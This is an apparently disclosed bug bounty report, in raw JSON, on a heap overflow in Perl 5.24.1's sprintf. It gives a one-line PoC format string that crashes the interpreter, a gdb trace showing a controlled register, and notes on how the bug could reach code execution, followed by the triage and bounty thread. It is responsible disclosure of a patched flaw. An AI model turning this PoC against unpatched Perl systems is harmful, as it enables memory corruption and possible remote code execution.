{"id":271330,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNzEzMzA=","url":"https://hackerone.com/reports/271330","title":"Format string implementation vulnerability, resulting in code execution","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2017-09-24T16:13:07.324Z","submitted_at":"2017-09-24T16:13:07.324Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"aerodudrizzt","url":"/aerodudrizzt","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/098/646/ebd692682f9cff0731c0021d35f72330a3c88a8c_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":30,"url":"https://hackerone.com/ibb-perl","handle":"ibb-perl","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/030/06e86a090af9d395cec5535eea83b90c72274566_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/030/06e86a090af9d395cec5535eea83b90c72274566_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Perl (IBB)","twitter_handle":"","website":"http://www.perl.org","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2019-10-13T10:32:46.177Z","bug_reporter_agreed_on_going_public_at":"2019-10-13T10:32:45.951Z","team_member_agreed_on_going_public_at":"2019-10-13T09:39:39.923Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"In a security audit to the sprintf implementation in perl (version 5.24.1) I found a major security vulnerability, here are the full details.\nTimeline:\n======\n* 6th of May, 2017 - disclosure to the PERL security mailing list\n* 8th of May, 2017 - vulnerability confirmed by PERL's security group, found relevant to *all* maintained branches\n* 9th of May, 2017 - patch issued to branches \"blead\"\n* 30th of May, 2017 - a patched 5.26 branch is released\n* 24th of August, 2017 - a patch was committed to the 5.24 branch, awaiting 5.24.3 release\n* 22nd of September, 2017 - 5.24.3 was released, announcing the format string vulnerability in the release notes - public disclosure by the project\n\nTechnical Details:\n===========\nfile: sv.c\nfunction: Perl_sv_vcatpvfn_flags\n\n* precis - represents a format's precision, and can be any size_t value\n* width - represents the format's width, and can be any non-negative size_t value\n* Using large values can cause *multiple Integer-Overflows* when calculating 'need' = the needed allocated space for a fraction\n * line 12300:        need += has_precis ? precis : 6; /* known default */\n * later on more values are added to need (need += 20, ...)\n* Later on the use of 'width' for padding with spaces *assumes* that there is enough space in the buffer, causing a *Buffer Overflow*\n\nPoC Script:\n------------\n```\nprint sprintf(\"%2000.2000f this is a spacer %4000.4294967245a\", 1, 0x0.00008234p+9);\n```\nCrash trace - tested on a 32 bit linux machine:\n--------------------------------------------------\n```\nProgram terminated with signal SIGSEGV, Segmentation fault.\n#0  0x080ebbe0 in Perl_runops_standard ()\n(gdb) bt\n#0  0x080ebbe0 in Perl_runops_standard ()\n#1  0x08069356 in S_fold_constants ()\n#2  0x080a8336 in Perl_yyparse ()\n#3  0x08083219 in perl_parse ()\n#4  0x0806218c in main ()\n(gdb) info reg\neax            0x20202020    538976288\necx            0x9f72900    167192832\nedx            0x0    0\nebx            0x0    0\nesp            0xbfe0e8c0    0xbfe0e8c0\nebp            0x9f6c4d0    0x9f6c4d0\nesi            0x9f6f58c    167179660\nedi            0x0    0\neip            0x80ebbe0    0x80ebbe0 \u003cPerl_runops_standard+16\u003e\neflags         0x10202    [ IF RF ]\ncs             0x73    115\nss             0x7b    123\nds             0x7b    123\nes             0x7b    123\nfs             0x0    0\ngs             0x33    51\n(gdb) x /10i $eip\n=\u003e 0x80ebbe0 \u003cPerl_runops_standard+16\u003e:    call   *0x8(%eax)\n   0x80ebbe3 \u003cPerl_runops_standard+19\u003e:    test   %eax,%eax\n   0x80ebbe5 \u003cPerl_runops_standard+21\u003e:    mov    %eax,0x8207a88\n   0x80ebbea \u003cPerl_runops_standard+26\u003e:    \n    jne    0x80ebbe0 \u003cPerl_runops_standard+16\u003e\n   0x80ebbec \u003cPerl_runops_standard+28\u003e:    mov    0x8207290,%eax\n   0x80ebbf1 \u003cPerl_runops_standard+33\u003e:    test   %eax,%eax\n   0x80ebbf3 \u003cPerl_runops_standard+35\u003e:    \n    jne    0x80ebc02 \u003cPerl_runops_standard+50\u003e\n   0x80ebbf5 \u003cPerl_runops_standard+37\u003e:    movb   $0x0,0x82072b0\n   0x80ebbfc \u003cPerl_runops_standard+44\u003e:    xor    %eax,%eax\n   0x80ebbfe \u003cPerl_runops_standard+46\u003e:    add    $0xc,%esp\n```\nAs you can see, the first %f print enlarged the buffer, and the controllable width in the second overflowed the buffer, causing eax to be corrupt (0x20 == ' '). The program itself crashed when tried to *execute* a pointer pointed by the *controlled* eax register (+8).\n\nThreat Analysis:\n------------------\nThis report demonstrates a potential code execution vulnerability, in case a sprintf format will be hostile. As format string attacks are relatively more popular on C/C++ languages, they are caused by the same programming bad practices:\n* \"Generic\" logging \\ monitoring module that receives format + args, and build the message string\n\nSuch kind of vulnerabilities are still common in modern code projects, and during my career I found such vulnerabilities even in many high-profile companies. Since Perl (such as Python, and Ruby) is a memory-managed language, the programmer relies on the interpreter to \"catch\" problems for him, meaning that most programmers assume that these programs won't be vulnerable to format string attacks.\n\nConclusion:\n========\nThe sprintf implementation has a *severe* vulnerability when handling a hostile format string. This vulnerability was demonstrated and can be easily leveraged into a remote code execution on the Perl interpreter (as I demonstrated previously in a similar vulnerability in a similar interpreter-based project).\n\nWill be more than happy to answer any question regarding the ticket,\nEyal Itkin.","vulnerability_information_html":"\u003cp\u003eIn a security audit to the sprintf implementation in perl (version 5.24.1) I found a major security vulnerability, here are the full details.\u003c/p\u003e\n\n\u003ch1 id=\"timeline\"\u003eTimeline:\u003c/h1\u003e\n\n\u003cul\u003e\n\u003cli\u003e6th of May, 2017 - disclosure to the PERL security mailing list\u003c/li\u003e\n\u003cli\u003e8th of May, 2017 - vulnerability confirmed by PERL\u0026#39;s security group, found relevant to \u003cem\u003eall\u003c/em\u003e maintained branches\u003c/li\u003e\n\u003cli\u003e9th of May, 2017 - patch issued to branches \u0026quot;blead\u0026quot;\u003c/li\u003e\n\u003cli\u003e30th of May, 2017 - a patched 5.26 branch is released\u003c/li\u003e\n\u003cli\u003e24th of August, 2017 - a patch was committed to the 5.24 branch, awaiting 5.24.3 release\u003c/li\u003e\n\u003cli\u003e22nd of September, 2017 - 5.24.3 was released, announcing the format string vulnerability in the release notes - public disclosure by the project\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch1 id=\"technical-details\"\u003eTechnical Details:\u003c/h1\u003e\n\n\u003cp\u003efile: sv.c\u003cbr\u003e\nfunction: Perl_sv_vcatpvfn_flags\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eprecis - represents a format\u0026#39;s precision, and can be any size_t value\u003c/li\u003e\n\u003cli\u003ewidth - represents the format\u0026#39;s width, and can be any non-negative size_t value\u003c/li\u003e\n\u003cli\u003eUsing large values can cause \u003cem\u003emultiple Integer-Overflows\u003c/em\u003e when calculating \u0026#39;need\u0026#39; = the needed allocated space for a fraction\n\n\u003cul\u003e\n\u003cli\u003eline 12300:        need += has_precis ? precis : 6; /* known default */\u003c/li\u003e\n\u003cli\u003elater on more values are added to need (need += 20, ...)\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eLater on the use of \u0026#39;width\u0026#39; for padding with spaces \u003cem\u003eassumes\u003c/em\u003e that there is enough space in the buffer, causing a \u003cem\u003eBuffer Overflow\u003c/em\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"poc-script\"\u003ePoC Script:\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eprint sprintf(\u0026quot;%2000.2000f this is a spacer %4000.4294967245a\u0026quot;, 1, 0x0.00008234p+9);\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"crash-trace-tested-on-a-32-bit-linux-machine\"\u003eCrash trace - tested on a 32 bit linux machine:\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eProgram terminated with signal SIGSEGV, Segmentation fault.\n#0  0x080ebbe0 in Perl_runops_standard ()\n(gdb) bt\n#0  0x080ebbe0 in Perl_runops_standard ()\n#1  0x08069356 in S_fold_constants ()\n#2  0x080a8336 in Perl_yyparse ()\n#3  0x08083219 in perl_parse ()\n#4  0x0806218c in main ()\n(gdb) info reg\neax            0x20202020    538976288\necx            0x9f72900    167192832\nedx            0x0    0\nebx            0x0    0\nesp            0xbfe0e8c0    0xbfe0e8c0\nebp            0x9f6c4d0    0x9f6c4d0\nesi            0x9f6f58c    167179660\nedi            0x0    0\neip            0x80ebbe0    0x80ebbe0 \u0026lt;Perl_runops_standard+16\u0026gt;\neflags         0x10202    [ IF RF ]\ncs             0x73    115\nss             0x7b    123\nds             0x7b    123\nes             0x7b    123\nfs             0x0    0\ngs             0x33    51\n(gdb) x /10i $eip\n=\u0026gt; 0x80ebbe0 \u0026lt;Perl_runops_standard+16\u0026gt;:    call   *0x8(%eax)\n   0x80ebbe3 \u0026lt;Perl_runops_standard+19\u0026gt;:    test   %eax,%eax\n   0x80ebbe5 \u0026lt;Perl_runops_standard+21\u0026gt;:    mov    %eax,0x8207a88\n   0x80ebbea \u0026lt;Perl_runops_standard+26\u0026gt;:    \n    jne    0x80ebbe0 \u0026lt;Perl_runops_standard+16\u0026gt;\n   0x80ebbec \u0026lt;Perl_runops_standard+28\u0026gt;:    mov    0x8207290,%eax\n   0x80ebbf1 \u0026lt;Perl_runops_standard+33\u0026gt;:    test   %eax,%eax\n   0x80ebbf3 \u0026lt;Perl_runops_standard+35\u0026gt;:    \n    jne    0x80ebc02 \u0026lt;Perl_runops_standard+50\u0026gt;\n   0x80ebbf5 \u0026lt;Perl_runops_standard+37\u0026gt;:    movb   $0x0,0x82072b0\n   0x80ebbfc \u0026lt;Perl_runops_standard+44\u0026gt;:    xor    %eax,%eax\n   0x80ebbfe \u0026lt;Perl_runops_standard+46\u0026gt;:    add    $0xc,%esp\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAs you can see, the first %f print enlarged the buffer, and the controllable width in the second overflowed the buffer, causing eax to be corrupt (0x20 == \u0026#39; \u0026#39;). The program itself crashed when tried to \u003cem\u003eexecute\u003c/em\u003e a pointer pointed by the \u003cem\u003econtrolled\u003c/em\u003e eax register (+8).\u003c/p\u003e\n\n\u003ch2 id=\"threat-analysis\"\u003eThreat Analysis:\u003c/h2\u003e\n\n\u003cp\u003eThis report demonstrates a potential code execution vulnerability, in case a sprintf format will be hostile. As format string attacks are relatively more popular on C/C++ languages, they are caused by the same programming bad practices:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e\u0026quot;Generic\u0026quot; logging \\ monitoring module that receives format + args, and build the message string\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eSuch kind of vulnerabilities are still common in modern code projects, and during my career I found such vulnerabilities even in many high-profile companies. Since Perl (such as Python, and Ruby) is a memory-managed language, the programmer relies on the interpreter to \u0026quot;catch\u0026quot; problems for him, meaning that most programmers assume that these programs won\u0026#39;t be vulnerable to format string attacks.\u003c/p\u003e\n\n\u003ch1 id=\"conclusion\"\u003eConclusion:\u003c/h1\u003e\n\n\u003cp\u003eThe sprintf implementation has a \u003cem\u003esevere\u003c/em\u003e vulnerability when handling a hostile format string. This vulnerability was demonstrated and can be easily leveraged into a remote code execution on the Perl interpreter (as I demonstrated previously in a similar vulnerability in a similar interpreter-based project).\u003c/p\u003e\n\n\u003cp\u003eWill be more than happy to answer any question regarding the ticket,\u003cbr\u003e\nEyal Itkin.\u003c/p\u003e\n","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":2,"name":"Memory Corruption - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2019-11-12T09:39:40.015Z","allow_singular_disclosure_after":-35667566.684961595,"singular_disclosure_allowed":true,"vote_count":7,"voters":["mik317","geeknik","japz","mayabea","script_kid","joeljeezy","unihorn"],"severity":{"rating":"medium","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":2073395,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Is there any update regarding the ticket? it was acknowledged and publicly fixed by the project before this ticket was opened, and the ticket itself is open for more than 3 weeks now.","markdown_message":"\u003cp\u003eIs there any update regarding the ticket? it was acknowledged and publicly fixed by the project before this ticket was opened, and the ticket itself is open for more than 3 weeks now.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-10-17T18:29:41.549Z","updated_at":"2017-10-17T18:29:41.549Z","actor":{"username":"aerodudrizzt","cleared":false,"url":"/aerodudrizzt","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/098/646/ebd692682f9cff0731c0021d35f72330a3c88a8c_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ibb-perl","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2128670,"is_internal":false,"editable":false,"type":"Activities::HackerRequestedMediation","message":"The ticket is now open for more than 5 weeks, and I received no reply/acknowledgment from the project during this entire period. The entire disclosure to the project's maintainers was finished before this ticket was opened, and they acknowledged my findings, patched the vulnerability and published it in 2 separate code versions.\n\nI would be really grateful to receive any update regarding this ticket, as it seems that IBB-related tickets tend to  be handled relatively slowly (average of more than a month for a ticket from my past experience). This fact does not encourage a researcher to keep on participating in IBB-related bug bounty programs.","markdown_message":"\u003cp\u003eThe ticket is now open for more than 5 weeks, and I received no reply/acknowledgment from the project during this entire period. The entire disclosure to the project\u0026#39;s maintainers was finished before this ticket was opened, and they acknowledged my findings, patched the vulnerability and published it in 2 separate code versions.\u003c/p\u003e\n\n\u003cp\u003eI would be really grateful to receive any update regarding this ticket, as it seems that IBB-related tickets tend to  be handled relatively slowly (average of more than a month for a ticket from my past experience). This fact does not encourage a researcher to keep on participating in IBB-related bug bounty programs.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-11-02T17:58:30.753Z","updated_at":"2017-11-02T17:58:30.753Z","actor":{"username":"aerodudrizzt","cleared":false,"url":"/aerodudrizzt","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/098/646/ebd692682f9cff0731c0021d35f72330a3c88a8c_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ibb-perl","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2213803,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hi Eyal! My sincerest apologies for delay here. Let me chat with the other panelists about this report and figure out what the next steps are.","markdown_message":"\u003cp\u003eHi Eyal! My sincerest apologies for delay here. Let me chat with the other panelists about this report and figure out what the next steps are.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-12-11T07:21:14.384Z","updated_at":"2017-12-11T07:21:14.384Z","actor":{"username":"neal","cleared":false,"url":"/neal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/072/0076b718b83dae590e6fd3d0749144c76d2044cd_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ibb-perl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2216152,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"@aerodudrizzt - Terribly sorry about the delay here. I'm having a bit of trouble tracking down the actual issue here in the changelog for `5.24.3`. Do you have a reference to the perl ticket # or relevant merge?","markdown_message":"\u003cp\u003e\u003ca href=\"/aerodudrizzt\"\u003e@aerodudrizzt\u003c/a\u003e - Terribly sorry about the delay here. I\u0026#39;m having a bit of trouble tracking down the actual issue here in the changelog for \u003ccode\u003e5.24.3\u003c/code\u003e. Do you have a reference to the perl ticket # or relevant merge?\u003c/p\u003e\n","automated_response":false,"created_at":"2017-12-12T05:59:03.497Z","updated_at":"2017-12-12T05:59:03.497Z","actor":{"username":"arice","cleared":false,"url":"/arice","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/020/83152cb2d070f3f6a63c1b61bae47257722b5ad2_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"ibb-perl","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2216573,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"In the 5.24.3 release notes (near the bottom) they mention a wrap around in the sprintf module. It seems that I don't have permissions for the  ticket that is [linked](https://rt.perl.org/Public/Bug/Display.html?id=131260). It is wierd since the perl security team sent my an e-mail saying that they are ready for a public disclosure.\n\nThe commit itself in the sprintf module:\n5.25 commit id: ddb03b72f46eae3c278f28e8758e87b9c98c66a1\n5.24 commit id: [661017e03ef252c7156aa4ac31e9069187fcc12c](https://github.com/Perl/perl5/commit/661017e03ef252c7156aa4ac31e9069187fcc12c)","markdown_message":"\u003cp\u003eIn the 5.24.3 release notes (near the bottom) they mention a wrap around in the sprintf module. It seems that I don\u0026#39;t have permissions for the  ticket that is \u003ca href=\"/redirect?url=https%3A%2F%2Frt.perl.org%2FPublic%2FBug%2FDisplay.html%3Fid%3D131260\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003elinked\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. It is wierd since the perl security team sent my an e-mail saying that they are ready for a public disclosure.\u003c/p\u003e\n\n\u003cp\u003eThe commit itself in the sprintf module:\u003cbr\u003e\n5.25 commit id: ddb03b72f46eae3c278f28e8758e87b9c98c66a1\u003cbr\u003e\n5.24 commit id: \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2FPerl%2Fperl5%2Fcommit%2F661017e03ef252c7156aa4ac31e9069187fcc12c\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003e661017e03ef252c7156aa4ac31e9069187fcc12c\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2017-12-12T07:27:40.118Z","updated_at":"2017-12-12T07:29:15.753Z","actor":{"username":"aerodudrizzt","cleared":false,"url":"/aerodudrizzt","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/098/646/ebd692682f9cff0731c0021d35f72330a3c88a8c_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ibb-perl","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2216580,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Ah, that's why I couldn't track it down. The commit has enough information though. Thanks!","markdown_message":"\u003cp\u003eAh, that\u0026#39;s why I couldn\u0026#39;t track it down. The commit has enough information though. Thanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2017-12-12T07:32:18.633Z","updated_at":"2017-12-12T07:32:18.633Z","actor":{"url":"/ibb-perl","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/030/06e86a090af9d395cec5535eea83b90c72274566_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Perl (IBB)"}},"bounty_amount":"500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"ibb-perl","collaborator":{"username":"aerodudrizzt","url":"/aerodudrizzt"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2216581,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2017-12-12T07:32:26.618Z","updated_at":"2017-12-12T07:32:26.618Z","actor":{"username":"arice","cleared":false,"url":"/arice","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/020/83152cb2d070f3f6a63c1b61bae47257722b5ad2_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"reporter":{"username":"aerodudrizzt","url":"/aerodudrizzt"},"genius_execution_id":null,"team_handle":"ibb-perl","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2216583,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you very much.","markdown_message":"\u003cp\u003eThank you very much.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-12-12T07:34:14.102Z","updated_at":"2017-12-12T07:34:14.102Z","actor":{"username":"aerodudrizzt","cleared":false,"url":"/aerodudrizzt","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/098/646/ebd692682f9cff0731c0021d35f72330a3c88a8c_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ibb-perl","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6026517,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-10-13T09:39:39.942Z","updated_at":"2019-10-13T09:39:39.942Z","first_to_agree":true,"actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"ibb-perl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6026789,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-10-13T10:32:46.115Z","updated_at":"2019-10-13T10:32:46.115Z","actor":{"username":"aerodudrizzt","cleared":false,"url":"/aerodudrizzt","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/098/646/ebd692682f9cff0731c0021d35f72330a3c88a8c_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ibb-perl","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6026790,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-10-13T10:32:46.199Z","updated_at":"2019-10-13T10:32:46.199Z","actor":{"username":"aerodudrizzt","cleared":false,"url":"/aerodudrizzt","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/098/646/ebd692682f9cff0731c0021d35f72330a3c88a8c_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ibb-perl","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}